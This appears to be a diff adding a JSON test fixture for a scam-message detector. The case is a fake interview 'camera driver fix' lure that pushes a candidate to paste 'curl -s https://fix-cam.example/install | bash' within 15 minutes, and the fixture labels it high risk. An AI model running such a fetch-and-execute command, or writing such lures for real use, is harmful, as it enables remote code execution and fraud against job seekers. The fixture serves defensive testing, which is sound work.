@@ -1,0 +1,20 @@
+{
+  "note": "ClickFix: run pasted terminal command before interview.",
+  "text": "Hi Sam, before your video interview with Cedar Grove Systems our platform detected a camera driver error. To fix it, open Terminal and paste this command: curl -s https://fix-cam.example/install | bash. Your interview starts in 15 minutes, so please do it now.",
+  "expectedLevel": "high",
+  "profile": { "field": "tech", "level": "junior", "skills": ["python", "react"] },
+  "source": null,
+  "stage": null,
+  "savedSteps": {
+    "extract": {
+      "status": "done",
+      "data": {
+        "isJobMessage": true,
+        "company": { "value": "Cedar Grove Systems", "quote": "Cedar Grove Systems" },
+        "asks": [{ "kind": "run_code_or_install", "quote": "open Terminal and paste this command: curl -s https://fix-cam.example/install | bash" }],
+        "pressure": [{ "quote": "Your interview starts in 15 minutes, so please do it now" }],
+        "interview": { "status": "mentioned", "quote": "before your video interview" }
+      }
+    }
+  }
+}
